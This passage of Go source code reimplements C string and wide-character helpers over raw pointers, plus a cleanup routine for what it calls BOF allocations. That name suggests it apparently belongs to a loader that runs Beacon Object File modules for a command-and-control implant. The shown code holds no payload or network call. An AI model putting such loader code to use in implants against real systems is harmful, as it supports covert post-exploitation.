		if *(*byte)(unsafe.Pointer(str + uintptr(length))) == 0 {
			break
		}
		length++
	}
	return length
}

func intStrcmp(str1 uintptr, str2 uintptr) int {
	s1 := ReadCStringFromPtr(str1)
	s2 := ReadCStringFromPtr(str2)

	if s1 < s2 {
		return -1
	} else if s1 > s2 {
		return 1
	}
	return 0
}

func intStrncmp(str1 uintptr, str2 uintptr, n int) int {
	s1 := ReadCStringFromPtr(str1)
	s2 := ReadCStringFromPtr(str2)

	if len(s1) > n {
		s1 = s1[:n]
	}
	if len(s2) > n {
		s2 = s2[:n]
	}

	if s1 < s2 {
		return -1
	} else if s1 > s2 {
		return 1
	}
	return 0
}

func intStrcpy(dst uintptr, src uintptr) uintptr {
	srcStr := ReadCStringFromPtr(src)
	for i, b := range []byte(srcStr) {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = b
	}
	*(*byte)(unsafe.Pointer(dst + uintptr(len(srcStr)))) = 0
	return dst
}

func intStrncpy(dst uintptr, src uintptr, n int) uintptr {
	srcStr := ReadCStringFromPtr(src)
	copyLen := len(srcStr)
	if copyLen > n {
		copyLen = n
	}

	for i := 0; i < copyLen; i++ {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = srcStr[i]
	}

	// Pad with zeros if needed
	for i := copyLen; i < n; i++ {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = 0
	}

	return dst
}

func intStrcat(dst uintptr, src uintptr) uintptr {
	dstLen := intStrlen(dst)
	srcStr := ReadCStringFromPtr(src)

	for i, b := range []byte(srcStr) {
		*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+i))) = b
	}
	*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+len(srcStr)))) = 0

	return dst
}

func intStrncat(dst uintptr, src uintptr, n int) uintptr {
	dstLen := intStrlen(dst)
	srcStr := ReadCStringFromPtr(src)

	copyLen := len(srcStr)
	if copyLen > n {
		copyLen = n
	}

	for i := 0; i < copyLen; i++ {
		*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+i))) = srcStr[i]
	}
	*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+copyLen))) = 0

	return dst
}

// Wide char conversion functions
func toWideChar(str uintptr, wide uintptr, size int) int {
	if str == 0 || wide == 0 {
		return 0
	}

	input := ReadCStringFromPtr(str)
	runes := []rune(input)
	utf16Encoded := utf16.Encode(runes)

	maxChars := size / 2
	if len(utf16Encoded) > maxChars {
		utf16Encoded = utf16Encoded[:maxChars]
	}

	for i, char := range utf16Encoded {
		*(*uint16)(unsafe.Pointer(wide + uintptr(i*2))) = char
	}

	// Null terminate
	if len(utf16Encoded) < maxChars {
		*(*uint16)(unsafe.Pointer(wide + uintptr(len(utf16Encoded)*2))) = 0
	}

	return len(utf16Encoded)
}

func Utf8ToUtf16(str uintptr, wide uintptr, size int) int {
	return toWideChar(str, wide, size)
}

func Utf16ToUtf8(wide uintptr, str uintptr, size int) int {
	if wide == 0 || str == 0 {
		return 0
	}

	// Read wide string
	wideStr := ReadWStringFromPtr(wide)
	utf8Bytes := []byte(wideStr)

	maxBytes := size
	if len(utf8Bytes) > maxBytes {
		utf8Bytes = utf8Bytes[:maxBytes]
	}

	for i, b := range utf8Bytes {
		*(*byte)(unsafe.Pointer(str + uintptr(i))) = b
	}

	// Null terminate
	if len(utf8Bytes) < maxBytes {
		*(*byte)(unsafe.Pointer(str + uintptr(len(utf8Bytes)))) = 0
	}

	return len(utf8Bytes)
}

// Helper function to read a C string from a pointer
func ReadCStringFromPtr(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}

	var result []byte
	for i := 0; ; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		if b == 0 {
			break
		}
		result = append(result, b)
	}
	return string(result)
}

// Helper function to read a wide string from a pointer
func ReadWStringFromPtr(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}

	var result []uint16
	for i := 0; ; i++ {
		w := *(*uint16)(unsafe.Pointer(ptr + uintptr(i*2)))
		if w == 0 {
			break
		}
		result = append(result, w)
	}
	return string(utf16.Decode(result))
}

func cleanupBOFAllocations() {
	bofAllocMutex.Lock()
	defer bofAllocMutex.Unlock()

	for ptr, mem := range bofAllocations {
		if mem == nil {
			// VirtualAlloc'd memory
			procVirtualFree.Call(ptr, 0, 0x8000) // MEM_RELEASE
		}
	}
	bofAllocations = make(map[uintptr][]byte)

	allocMutex.Lock()
	allocatedMemory = make(map[uintptr][]byte)
	allocMutex.Unlock()
}

func verifyMemory(ptr uintptr, expectedContent string) {
	if ptr == 0 {
		return
	}

	// Read up to 32 bytes
	bytes := make([]byte, 0, 32)
	for i := 0; i < 32; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		bytes = append(bytes, b)
		if b == 0 {
			break
		}
	}

	_ = string(bytes[:len(bytes)-1]) // Remove null terminator
}
